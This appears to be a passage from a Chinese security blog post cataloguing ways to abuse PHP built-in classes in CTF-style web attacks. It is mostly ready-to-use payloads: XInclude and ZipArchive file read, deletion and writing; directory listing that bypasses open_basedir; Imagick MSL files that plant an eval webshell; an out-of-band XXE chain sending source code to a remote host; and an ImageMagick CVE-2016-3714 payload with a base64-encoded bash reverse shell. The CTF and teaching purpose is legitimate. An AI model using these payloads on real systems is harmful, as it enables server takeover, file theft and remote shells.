<pre><code class="highlight plaintext">&lt;?php $a = filter_input(1,&quot;file&quot;);; $xml = &lt;&lt;&lt;EOD &lt;?xml version=&quot;1.0&quot; ?&gt; &lt;root xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt; &lt;xi:include href=&quot;$a&quot; parse=&quot;text&quot;/&gt; &lt;/root&gt; EOD; $dom = new DOMDocument; $dom-&gt;preserveWhiteSpace = false; $dom-&gt;formatOutput = true; $dom-&gt;loadXML($xml); $dom-&gt;xinclude(); echo $dom-&gt;saveXML();</code></pre>
<h2 id="文件探测"><a class="markdownIt-Anchor" href="#文件探测"></a> 文件探测</h2>
<h3 id="文件是否存在finfo"><a class="markdownIt-Anchor" href="#文件是否存在finfo"></a> 文件是否存在(<code>finfo</code>)</h3>
<p>利用版本: (PHP &gt;= 5.3.0, PECL <code>fileinfo</code> &gt;= 0.1.0) 判断文件是否存在(判断文件类型)</p>
<pre><code class="highlight php"><span class="variable">$f</span> = <span class="string">&quot;./aasd.php&quot;</span>; <span class="variable">$ff</span> = <span class="keyword">new</span> <span class="title function_ invoke__">finfo</span>(FILEINFO_MIME); <span class="keyword">echo</span> <span class="variable">$ff</span>-&gt;<span class="title function_ invoke__">file</span>(<span class="variable">$f</span>);</code></pre>
<h3 id="目录遍历directory"><a class="markdownIt-Anchor" href="#目录遍历directory"></a> 目录遍历:Directory</h3>
<p>这个类本意是不能够直接通过 new 方式进行创建利用，当使用 dir 函数时，这个类会被实例化。但我们依然可以直接实例化并使用其中的方法</p>
<p><strong>判断文件是否存在:</strong></p>
<pre><code class="highlight php"><span class="comment"># 判断某个目录是否存在，</span>
<span class="comment"># 如果存在返回目录字符串，若不存在则产生警告并返回NULL</span>
<span class="variable">$dir</span>=<span class="string">&quot;/etc&quot;</span>;
<span class="keyword">echo</span> (<span class="keyword">new</span> <span class="built_in">Directory</span>)-&gt;<span class="title function_ invoke__">read</span>(<span class="title function_ invoke__">opendir</span>(<span class="variable">$dir</span>));</code></pre>
<p><strong>读取目录:</strong></p>
<pre><code class="highlight php"><span class="variable">$dir</span> = <span class="string">&quot;/etc&quot;</span>;
<span class="variable">$d</span> = <span class="keyword">new</span> <span class="built_in">Directory</span>;
<span class="variable">$d</span>-&gt;resource = <span class="title function_ invoke__">opendir</span>(<span class="variable">$dir</span>);
<span class="keyword">while</span>((<span class="variable">$c</span> = <span class="variable">$d</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$d</span>-&gt;resource)))&#123;<span class="keyword">echo</span> <span class="variable">$c</span>.<span class="string">&quot;\n&quot;</span>;&#125;;</code></pre>
<h3 id="目录遍历directoryiterator"><a class="markdownIt-Anchor" href="#目录遍历directoryiterator"></a> 目录遍历:<code>DirectoryIterator</code></h3>
<p><code>DirectoryIterator</code> 会创建一个指定目录的迭代器。当执行到echo函数时，会触发<code>DirectoryIterator</code>类中的 <code>__toString()</code> 方法，输出指定目录里面经过排序之后的第一个文件名.</p>
<p>遍历文件目录,直接对文件全部输出出来.</p>
<pre><code class="highlight plaintext">&lt;?php $dir=new DirectoryIterator(&quot;/&quot;); foreach($dir as $f)&#123;    echo($f.&#x27;&lt;br&gt;&#x27;);    //echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;); &#125;</code></pre>
<p>利用<code> DirectoryIterator</code> 类对象 + glob:// 协议获取目录结构，能够突破 <code>open_basedir</code> 的限制：</p>
<pre><code class="highlight plaintext">$dir=new DirectoryIterator(&quot;glob:///*&quot;); foreach($dir as $f)&#123;    echo($f.&#x27;&lt;br&gt;&#x27;);    //echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;); &#125;</code></pre>
<p>一些其他的用法：</p>
<pre><code class="highlight plaintext"># 简单列目录
$dir = &quot;./geek&quot;;
$d = new DirectoryIterator($dir);
while ($d-&gt;valid())&#123;
    echo $d.&quot;\n&quot;;
    $d-&gt;next();
&#125;

# 也可以用来获取文件的信息
$dir = &quot;./geek&quot;;
$d = new DirectoryIterator($dir);
while($d-&gt;valid())&#123;

    # 获取最后访问时间
    var_dump($d-&gt;getATime());
    # 获取创建时间
    var_dump($d-&gt;getCTime());
    # 获取最后修改时间
    var_dump($d-&gt;getMtime());
    # 获取文件名，
    # 直接用 __toString 也可以
    var_dump($d-&gt;getFilename());
    var_dump((string)$d);
    # 获取文件名 (自动除去后缀名)，
    # 比如除去 .php 后缀名
    var_dump($d-&gt;getBasename(&quot;php&quot;));
    # 获取目录和文件名
    var_dump($d-&gt;getPathname());
    # 获取文件所有者
    var_dump($d-&gt;getOwner());
    # 获取文件所有组
    var_dump($d-&gt;getGroup());
    # 获取文件inode编号
    var_dump($d-&gt;getInode());
    # 获取文件权限
    var_dump(substr(sprintf(&quot;%o&quot;,$d-&gt;getPerms()),-4));
    # 获取文件大小
    var_dump(($d-&gt;getSize()/1024).&quot; kb&quot;);
    # 获取文件类型 (file/dir)
    var_dump($d-&gt;getType());
    # 判断文件是否是目录
    var_dump($d-&gt;isDir());
    # 判断文件是否是文件 (不是目录)
    var_dump($d-&gt;isFile());
    # 判断文件是否为 ./..
    var_dump($d-&gt;isDot());
    # 判断文件是否可执行
    var_dump($d-&gt;isExecute());
    # 判断文件是否是链接文件
    var_dump($d-&gt;isLink());
    # 判断文件是否可读
    var_dump($d-&gt;isReadable());
    # 判断文件是否可写
    var_dump($d-&gt;isWriteable());

    $d-&gt;next();
&#125;

# 一些其他方法的功能
# 获取当前目录路径 (其实也就是 ? )
var_dump($d-&gt;path());
# 获取当前元素的索引
var_dump($d-&gt;key());
# 将当前索引移动到下一个元素
$d-&gt;next();
# 将索引重置到开头
$d-&gt;rewind();
# 设置索引
$d-&gt;seek(0);
# 判断当前索引的文件是否合法 (是否是一个文件)
$d-&gt;vaild();
</code></pre>
<h3 id="目录遍历filesystemiterator"><a class="markdownIt-Anchor" href="#目录遍历filesystemiterator"></a> 目录遍历:<code>FilesystemIterator</code></h3>
<p>利用版本：(PHP 5 &gt;= 5.3.0, PHP 7)</p>
<p>其实这个类实际上也就是 <code>DirectoryIterator</code> 类的升级版，基本继承了<code> DirectorIterator</code> 类的所有方法，所以利用方式和 <code>DirectorIterator</code> 一样:</p>
<h3 id="目录遍历globiterator"><a class="markdownIt-Anchor" href="#目录遍历globiterator"></a> 目录遍历:<code>GlobIterator</code></h3>
<p>利用版本：(PHP 5 &gt;= 5.3.0, PHP 7)<code>GlobIterator</code>无需配合 glob:// 协议枚举目录。</p>
<pre><code class="highlight plaintext">foreach(new GlobIterator(&quot;./*&quot;) as $f)&#123;    echo $f.&quot;\n&quot;; &#125;</code></pre>
<p>在 CTF 中如果知道了 flag 的位置，但不知道 flag 的文件名，则可以使用:<code>GlobIterator(&quot;/*flag*&quot;)</code></p>
<h3 id="文件操作ziparchive"><a class="markdownIt-Anchor" href="#文件操作ziparchive"></a> 文件操作:ZipArchive</h3>
<p>利用版本: (PHP 5 &gt;= 5.2.0, PHP 7, PECL zip &gt;= 1.1.0)</p>
<p>这个类是在php5.2.0之后引入的，我们之前会在一些原生类利用中见到它，我们可以用这个类来删除文件，读取文件以及有损写文件。</p>
<p><strong>删除文件</strong></p>
<pre><code class="highlight plaintext">$a=new ZipArchive();
$a-&gt;open(&quot;file&quot;, ZipArchive::OVERWRITE); // ZipArchive::CREATE也可以用8代替</code></pre>
<p><strong>读取文件</strong></p>
<pre><code class="highlight plaintext">$f = &quot;flag&quot;;
$zip=new ZipArchive();
$zip-&gt;open(&quot;a.zip&quot;, ZipArchive::CREATE);
$zip-&gt;addFile($f);
$zip-&gt;close();
$zip-&gt;open(&quot;a.zip&quot;);
echo $zip-&gt;getFromName($f);
$zip-&gt;close();</code></pre>
<p><strong>有损写文件</strong></p>
<pre><code class="highlight plaintext">$f = &quot;flag&quot;;
$zip=new ZipArchive();
$zip-&gt;open(&quot;a.zip&quot;, ZipArchive::CREATE);
$zip-&gt;setArchiveComment(&quot;&lt;?php phpinfo();?&gt;&quot;);
$zip-&gt;addFromString(&quot;file&quot;, &quot;&quot;);
$zip-&gt;close();
//include &quot;a.zip&quot;;</code></pre>
<h2 id="rce"><a class="markdownIt-Anchor" href="#rce"></a> RCE</h2>
<p><a target="_blank" rel="noopener" href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">Exploiting Arbitrary Object Instantiations in PHP without Custom Classes – PT SWARM</a> 这篇文章的作者在应对如下场景时找到了一种新的利用手法——Imagick。</p>
<pre><code class="highlight plaintext">new $_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;]);</code></pre>
<p>如果仅可控类名和一个参数名，且只能够实例化对象，不能执行对象方法的情况下，同样可以实现 RCE。</p>
<h3 id="空字节截断"><a class="markdownIt-Anchor" href="#空字节截断"></a> 空字节截断</h3>
<p>Imagick 参数被空字节截断也可以正常使用</p>
<pre><code class="highlight plaintext"># No errors $a = new Imagick(&quot;/tmp/positive.png\x00.jpg&quot;); # No errors $a = new Imagick(&quot;http://attacker.com/test\x00test&quot;);</code></pre>
<h3 id="https"><a class="markdownIt-Anchor" href="#https"></a> https:/</h3>
<p>https:/ 会调用 curl</p>
<pre><code class="highlight plaintext">$a = new Imagick(&quot;https:/127.0.0.1:9999/positive.png\x00.jpg&quot;);</code></pre>
<h3 id="vid-tempfile-rce"><a class="markdownIt-Anchor" href="#vid-tempfile-rce"></a> vid + tempfile RCE</h3>
<p>php 会将 post 接收到的文件以临时文件的形式保存在 /tmp 下。假设我们上传一个 msl 文件如下</p>
<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;image&gt; &lt;read filename=&quot;caption:&lt;?php @eval(@$_REQUEST[&#x27;a&#x27;]); ?&gt;&quot; /&gt; &lt;!-- Relative paths such as info:./../../uploads/swarm.php can be used as well --&gt; &lt;write filename=&quot;info:/var/www/swarm.php&quot; /&gt; &lt;/image&gt;</code></pre>
<p>如果使用 vid:msl 的形式将该临时文件进行读取，解析 msl 时会将 webshell 的内容写入 /var/www/swarm.php</p>
<pre><code class="highlight plaintext">$a = new Imagick(&quot;vid:msl:/tmp/php*&quot;);</code></pre>
<p>CISCN 2022 有根据这个知识点出过题：<a target="_blank" rel="noopener" href="https://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md">CTF-Challenges/CISCN/2022/backdoor/writup/writup.md at master · AFKL-CUIT/CTF-Challenges · GitHub</a>，但利用 payload 有所区别, 使用 inline 将文件内容以 base64 的形式编码在 msl 文件中。</p>
<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;image&gt; &lt;read filename=&quot;inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw/cGhwIGV2YWwoJF9HRVRbMV0pOz8+fE86ODoiYmFja2Rvb3IiOjI6e3M6NDoicGF0aCI7czoxNDoiL3RtcC9zZXNzX2Fma2wiO3M6MTI6ImRvX2V4ZWNfZnVuYyI7YjowO30=&quot; /&gt; &lt;write filename=&quot;/tmp/sess_afkl&quot; /&gt; &lt;/image&gt;</code></pre>
<p>SCTF 2023 中对这种利用方式进行了探索，可以达到读取文件内容的效果。</p>
<pre><code class="highlight xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> <span class="tag">&lt;<span class="name">image</span>&gt;</span> <span class="tag">&lt;<span class="name">read</span> <span class="attr">filename</span>=<span class="string">&quot;mvg:/flag&quot;</span> /&gt;</span> <span class="tag">&lt;<span class="name">write</span> <span class="attr">filename</span>=<span class="string">&quot;/tmp/xxxx&quot;</span> /&gt;</span> <span class="tag">&lt;/<span class="name">image</span>&gt;</span></code></pre>
<h2 id="xxe"><a class="markdownIt-Anchor" href="#xxe"></a> XXE</h2>
<h3 id="simplexmlelement"><a class="markdownIt-Anchor" href="#simplexmlelement"></a> SimpleXMLElement</h3>
<pre><code class="highlight plaintext"> class SimpleXMLElement implements Stringable, Countable, RecursiveIterator &#123;
    /* Methods */
    public __construct(
        string $data,
        int $options = 0,
        bool $dataIsURL = false,
        string $namespaceOrPrefix = &quot;&quot;,
        bool $isPrefix = false
    )
    public addAttribute(string $qualifiedName, string $value, ?string $namespace = null): void
    public addChild(string $qualifiedName, ?string $value = null, ?string $namespace = null): ?SimpleXMLElement
    public asXML(?string $filename = null): string|bool
    public attributes(?string $namespaceOrPrefix = null, bool $isPrefix = false): ?SimpleXMLElement
    public children(?string $namespaceOrPrefix = null, bool $isPrefix = false): ?SimpleXMLElement
    public count(): int
    public getDocNamespaces(bool $recursive = false, bool $fromRoot = true): array|false
    public getName(): string
    public getNamespaces(bool $recursive = false): array
    public registerXPathNamespace(string $prefix, string $namespace): bool
    public __toString(): string
    public xpath(string $expression): array|null|false
&#125;</code></pre>
<ul>
<li>data: xml 字符串，xml 文档路径或者 url 路径（如果 dataIsURL 为 true</li>
<li>dataIsURL: 默认情况下为 false，为 true 时 data 为一个 url 路径</li>
<li>option：设置为 LIBXML_NOENT 时，可能会导致 xxe 攻击，LIBXML_NOENT 为 2.</li>
</ul>
<p><strong>读取文件</strong></p>
<p>poc:</p>
<pre><code class="highlight plaintext">$x=new SimpleXMLElement(&quot;http://xxx.xxx.xxx.xxx/evil.xml&quot;,2,true);</code></pre>
<p>evil.xml</p>
<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot;?&gt;   &lt;!DOCTYPE ANY[   &lt;!ENTITY % remote SYSTEM &quot;http://xxx.xxx.xxx.xxx/send.xml&quot;&gt;   %remote;   %all;   %send;   ]&gt;</code></pre>
<p>send.xml</p>
<pre><code class="highlight plaintext">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot;&gt;   &lt;!ENTITY % all &quot;&lt;!ENTITY % send SYSTEM &#x27;http://xxx.xxx.xxx.xxx/send.php?file=%file;&#x27;&gt;&quot;&gt;</code></pre>
<h3 id="simplexmliterator"><a class="markdownIt-Anchor" href="#simplexmliterator"></a> <code>SimpleXMLIterator</code></h3>
<p>可用于代替 <code>SimpleXMLElement</code></p>
<h3 id="imagemagick"><a class="markdownIt-Anchor" href="#imagemagick"></a> <code>ImageMagick</code></h3>
<p>配合XXE进行RCE，参考<strong>CVE-2016-3714</strong></p>
<pre><code class="highlight plaintext">影响版本ImageMagick &lt;6.9.3-9</code></pre>
<p><code>ImageMagick</code>有一个功能叫做<code>delegate(委托)</code>，作用是调用外部的lib文件来处理文件，在这过程中会使用到系统的system命令</p>
<p>在漏洞报告中利用了/etc/ImageMagick/delegate.xml中的这一段委托</p>
<pre><code class="highlight xml"><span class="tag">&lt;<span class="name">delegate</span> <span class="attr">decode</span>=<span class="string">&quot;https&quot;</span> <span class="attr">command</span>=<span class="string">&quot;<span class="symbol">&amp;quot;</span>curl<span class="symbol">&amp;quot;</span> -s -k -o <span class="symbol">&amp;quot;</span>%o<span class="symbol">&amp;quot;</span> <span class="symbol">&amp;quot;</span>https:%M<span class="symbol">&amp;quot;</span>&quot;</span>/&gt;</span></code></pre>
<p>它在解析https文件时用curl命令将其下载，%M被直接放在curl的最后一个参数内</p>
<p><code>ImageMagick</code>默认支持<code>mvg</code>的文件格式,<code>mvg</code>与<code>svg</code>格式类似，其中是以文本形式写入矢量图的内容，而这其中包含了https的处理过程</p>
<p>我们可以构造一个<code>mvg</code>文件来进行rce(后缀不一定要用<code>.mvg</code>，<code>ImageMagick</code>自动根据上传的内容将其识别为<code>mvg</code>图片)</p>
<p>并在<a target="_blank" rel="noopener" href="https://xn--jorud1bxa132l1t1f">https://后闭合双引号</a>，写入执行的命令</p>
<pre><code class="highlight svg">push graphic-context
viewbox 0 0 640 480
fill &#x27;url(https://&quot;|id; &quot;)&#x27;
pop graphic-context</code></pre>
<p>反弹shell</p>
<pre><code class="highlight plaintext">push graphic-context
viewbox 0 0 640 480
fill &#x27;url(https://127.0.0.1/oops.jpg?`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguODEuMjMyLzg4ODggMD4mMQ== | base64 -d | bash`&quot;||id &quot; )&#x27;
pop graphic-context</code></pre>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>请我一杯咖啡吧！</div>
  <button>
    赞赏
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.jpg" alt="AyaN0 微信">
        <span>微信</span>
      </div>

  </div>
</div>

          <div class="post-tags">
              <a href="/tags/Web/" rel="tag"># -Web</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/07/01/Nosql%E6%B3%A8%E5%85%A5/" rel="prev" title="Nosql注入">
                  <i class="fa fa-angle-left"></i> Nosql注入
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2025/07/07/114514%E5%88%86%E9%92%9F%E8%83%BD%E4%BA%86%E8%A7%A3SSRF%E5%90%97/" rel="next" title="114514分钟能了解SSRF吗">
                  114514分钟能了解SSRF吗 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">AyaN0</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">335k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">10:08</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
